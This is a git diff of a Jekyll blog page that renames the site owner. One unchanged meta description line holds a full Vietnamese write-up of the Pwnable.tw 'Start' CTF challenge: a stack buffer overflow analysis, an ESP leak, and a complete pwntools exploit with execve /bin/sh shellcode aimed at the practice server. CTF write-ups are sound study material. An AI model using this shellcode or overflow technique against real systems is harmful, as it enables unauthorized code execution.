@@ -11,9 +11,9 @@
 
   <link rel="stylesheet" href="/css/main.css">
   <link rel="canonical" href="http://localhost:4000/2023/06/23/Pwnable.tw.html">
-  <link rel="alternate" type="application/rss+xml" title="George Do" href="http://localhost:4000/feed.xml">
+  <link rel="alternate" type="application/rss+xml" title="Duc Dat Dau" href="http://localhost:4000/feed.xml">
   <!-- Begin Jekyll SEO tag v2.8.0 -->
-<title>Pwnable.tw | George Do</title>
+<title>Pwnable.tw | Duc Dat Dau</title>
 <meta name="generator" content="Jekyll v4.3.2" />
 <meta property="og:title" content="Pwnable.tw" />
 <meta property="og:locale" content="en_US" />
@@ -21,7 +21,7 @@
 <meta property="og:description" content="0x00 Giới thiệu Khoảng một tháng trở lại đây, tôi chuyên tâm hơn vào việc chơi pwn. Một phần là vì mảng pwn khó, phần còn lại là tôi nghĩ nó có thể giúp tôi kiếm được tiền :)) Vì là một người mới, những kiến thức mà tôi viết ở đây có thể chưa chính xác hoàn toàn. Rất mong các bạn đọc góp ý để tôi phát triển hơn nữa. Pwnable.tw là một trang luyện tập mảng pwn khá nổi tiếng của Đài Loan. Theo tôi cảm nhận, thử thách ở đây khá khó cho người mới. Nếu các bạn không làm được thì cũng đừng lấy gì làm lạ. Tôi đã mất khoảng hơn 1 tuần để nghiền ngẫm challenge đầu tiên. 0x01 Start I. Tổng quan Đề bài cho chúng ta duy nhất một file là start. Việc đầu tiên tôi thường làm sẽ là kiểm tra xem file là 32 hay 64 bits. Để kiểm tra, tôi thường dùng file. $ file start start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped Thông tin cho chúng ta biết được đây là một file 32 bits. Load chương trình vào IDAPRO x32, quan sát các hàm ở mục Functions, nhận thấy rằng chương trình chỉ xoay quanh hàm _start. Tiếp đến, tôi sẽ sử dụng checksec để kiểm tra các lớp bảo vệ của file. Tôi đoán sẽ có nhiều bạn không hiểu dùng checksec để làm gì. Ngày trước tôi cũng như vậy, nhưng sau một khoảng thời gian ngắn, tôi được tiếp cận thêm về lỗ bổng BOF - Buffer Overflow, tôi mới thấy nó vô cũng hữu hiệu. $ checksec --file=&quot;start&quot; RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE No RELRO No canary found NX disabled No PIE No RPATH No RUNPATH 8) Symbols No 0 0 start Đối với bài toán này, để đơn giản, các bạn chỉ cần quan tâm tới thông số NX: Disabled. Nghĩa là các bạn có thể chèn mã thực thi lên stack. Nếu NX: Enabled, cho dù mã thực thi được chèn lên stack thì nó vẫn sẽ không hoạt động. II. Phân tích push esp push offset _exit xor eax, eax xor ebx, ebx xor ecx, ecx xor edx, edx push 3A465443h push 20656874h push 20747261h push 74732073h push 2774654Ch mov ecx, esp ; addr mov dl, 14h ; len mov bl, 1 ; fd mov al, 4 int 80h ; LINUX - sys_write xor ebx, ebx mov dl, 3Ch ; &#39;&lt;&#39; mov al, 3 int 80h ; LINUX - add esp, 14h retn Mã assembly của hàm _start rất dễ đọc, chúng ta sẽ đi phân tích nội dung từng đoạn code. Việc đầu tiên là đẩy thanh ghi ESP và offset của hàm _exit vào trong stack. Sau đó, gán giá trị của 4 thanh ghi EAX, EBX, ECX, EDX = 0. Tiếp theo là đẩy các giá trị 3A465443h, 20656874h, 20747261h, 74732073h, 2774654Ch vào trong stack. Câu hỏi đặt ra ở đây là 5 con số trên là gì vậy? Rất đơn giản, nó chính là: 3A465443h = “:FTC” 20656874h = “ eht” 20747261h = “ tra” 74732073h = “ts s” 2774654Ch = “‘teL” Chúng đại diện cho chuỗi “Let’s start the CTF:” Đoạn mã tiếp theo, chương trình gọi ra 2 system call là sys_write và sys_read mov ecx, esp ; addr mov dl, 14h ; len mov bl, 1 ; fd mov al, 4 int 80h ; LINUX - sys_write Thông tin của sys_write: Xuất ra màn hình chuỗi từ địa chỉ ESP hiện tại Số byte: 0x14 bytes File descriptor: stdout xor ebx, ebx mov dl, 3Ch ; &#39;&lt;&#39; mov al, 3 int 80h ; LINUX - sys_read Thông tin của sys_read Đọc một chuỗi từ bộ nhập chuẩn Số byte: 0x3C Đoạn mã cuối cùng tăng giá trị thanh ghi ESP lên 0x14 đơn vị. retn gọi địa chỉ thanh ghi ESP đang giữ rồi cộng ESP lên 4 đơn vị. add esp, 14h retn III. Lỗ hổng Chúng ta cùng nhìn qua cấu trúc của stack trước khi gọi 2 system call. Giá trị của thanh ghi ESP ở: Hiện tại: 0xFFFFD124 Ban đầu: 0xFFFFD140 Chú ý rằng, thường các challenge sẽ bật Address Space Layout Randomization nên giá trị thanh ghi ESP ban đầu luôn có giá trị ngẫu nhiên. (Đây là lý do vì sao mình không lấy ESP = 0xFFFFD140 để khai thác lỗ hổng) Như ta đã phân tích ở trên, sys_read cho phép đọc 60 bytes vào stack. Nếu chúng đã nhập vào 20 bytes, thì từ địa chỉ 0xFFFFD124 đến 0xFFFFD134 sẽ được fill đủ. Giả sử chúng ta tiếp tục nhập vào, các giá trị tại các địa chỉ trên nó sẽ bị thay đổi. Dẫn tới lỗ hổng BOF. IV. Hướng tấn công Công việc chúng ta cần thực hiện: Lấy được địa chỉ thanh ghi ESP ban đầu. Từ việc có được giá trị thanh ghi ESP ban đầu, chúng ta sẽ đưa địa chỉ trả về của hàm là địa chỉ của shellcode. Công việc 1 Để lấy giá trị của thanh ghi ESP ban đầu rất đơn giản. Chúng ta nhập đủ 20 bytes để lấp đầy địa chỉ từ 0xFFFFD124 đến 0xFFFFD134, tiếp tục ghi thêm 4 bytes 0x08048087 để chương trình có thể gọi system call read và write lần thứ 2. Bây giờ, giá trị của thanh ghi ESP sẽ là: 0xFFFFD124 + 0x14 + 0x4 = 0xFFFFD13C. Chú ý, đây cũng là nơi chứa giá trị thanh ghi ESP ban đầu. Lợi dụng việc gọi sys_write lần thứ 2. Chỉ cần in ra 4 bytes đầu tiên, chúng ta sẽ lấy được địa chỉ ESP ban đầu. payload1 = b&#39;x&#39; * 0x14 + p32(0x08048087) r.sendafter(b&#39;:&#39;, payload1) esp_leaked = u32(r.recv()[:4]) Công việc 2 Sau khi đã có địa chỉ ESP ban đầu. Việc của chúng ta là phải tính toán xem phải input bao nhiêu ký tự để chương trình có thể thực thi được shellcode. Gọi địa chỉ ESP ban đầu là ESP = X, giá trị hiện tại ESP = X - 4 Sau khi sys_read được gọi, ESP + 0x14, nghĩa là ESP đứng ở X + 16. Ở X + 16, chúng ta chỉ cần gán cho nó giá trị là X + 20, nơi shellcode được viết. Hàm trả về sẽ là địa chỉ shellcode được bắt đầu. payload2 = b&#39;x&#39; * 0x14 + p32(leaked_esp + 0x14) + shellcode V. Mã khai thác from pwn import * r = remote(&quot;chall.pwnable.tw&quot;, 10000) shellcode = b&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&quot; payload1 = b&#39;x&#39; * 0x14 + p32(0x08048087) r.sendafter(b&#39;:&#39;, payload1) esp_leaked = u32(r.recv()[:4]) payload2 = b&#39;x&#39; * 0x14 + p32(esp_leaked + 0x14) + shellcode r.send(payload2) r.interactive() VI. Tham khảo Pwnable.tw - Start @y198 Pwnable.tw - Start @c01dkit" />
 <link rel="canonical" href="http://localhost:4000/2023/06/23/Pwnable.tw.html" />
 <meta property="og:url" content="http://localhost:4000/2023/06/23/Pwnable.tw.html" />
-<meta property="og:site_name" content="George Do" />
+<meta property="og:site_name" content="Duc Dat Dau" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2023-06-23T00:00:00+07:00" />
 <meta name="twitter:card" content="summary" />
@@ -40,7 +40,7 @@
 
   <div class="wrapper">
 
-    <a class="site-title" href="/">George Do</a>
+    <a class="site-title" href="/">Duc Dat Dau</a>
 
     <nav class="site-nav">
       <a href="#" class="menu-icon">
@@ -543,13 +543,13 @@ Giả sử chúng ta tiếp tục nhập vào, các giá trị tại các địa
 
   <div class="wrapper">
 
-    <h2 class="footer-heading">George Do</h2>
+    <h2 class="footer-heading">Duc Dat Dau</h2>
 
     <div class="footer-col-wrapper">
       <div class="footer-col footer-col-1">
         <ul class="contact-list">
-          <li>George Do</li>
-          <li><a href="mailto:contact.georgedo@gmail.com">contact.georgedo@gmail.com</a></li>
+          <li>Duc Dat Dau</li>
+          <li><a href="mailto:contact.ducdatdau@gmail.com">contact.ducdatdau@gmail.com</a></li>
           <!-- <li><script type="text/javascript" id="clustrmaps" src="//clustrmaps.com/map_v2.js?d=bWWMtUHXhX4_KVnkJ-k1GL_PEZEA0lCjHMP81H6JXAA&cl=ffffff&w=a"></script></li> -->
           <li><script type="text/javascript" id="clstr_globe" src="//clustrmaps.com/globe.js?d=hTxyDCpAFGmse2NCHLjlA3079v7NSBHXIjnN8mG-hlE"></script></li>
         </ul>
@@ -559,25 +559,25 @@ Giả sử chúng ta tiếp tục nhập vào, các giá trị tại các địa
         <ul class="social-media-list">
           
           <li>
-            <a href="https://github.com/geordo"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
-</span><span class="username">geordo</span></a>
+            <a href="https://github.com/ducdatdau"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
+</span><span class="username">ducdatdau</span></a>
 
           </li>
           
 
           
           <li>
-            <a href="https://twitter.com/georgedo_twit"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
-</span><span class="username">georgedo_twit</span></a>
+            <a href="https://twitter.com/ducdatdau"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
+</span><span class="username">ducdatdau</span></a>
 
           </li>
           
 
           
           <li>
-            <a href="https://www.linkedin.com/in/geordo">
+            <a href="https://www.linkedin.com/in/ducdatdau">
   <span class="icon icon--linkedin"><svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414"><path d="M13.632 13.635h-2.37V9.922c0-.886-.018-2.025-1.234-2.025-1.235 0-1.424.964-1.424 1.96v3.778h-2.37V6H8.51v1.04h.03c.318-.6 1.092-1.233 2.247-1.233 2.4 0 2.845 1.58 2.845 3.637v4.188zM3.558 4.955c-.762 0-1.376-.617-1.376-1.377 0-.758.614-1.375 1.376-1.375.76 0 1.376.617 1.376 1.375 0 .76-.617 1.377-1.376 1.377zm1.188 8.68H2.37V6h2.376v7.635zM14.816 0H1.18C.528 0 0 .516 0 1.153v13.694C0 15.484.528 16 1.18 16h13.635c.652 0 1.185-.516 1.185-1.153V1.153C16 .516 15.467 0 14.815 0z" fill-rule="nonzero"/></svg></span>
-  <span class="label">geordo</span>
+  <span class="label">ducdatdau</span>
 </a>
 
           </li>
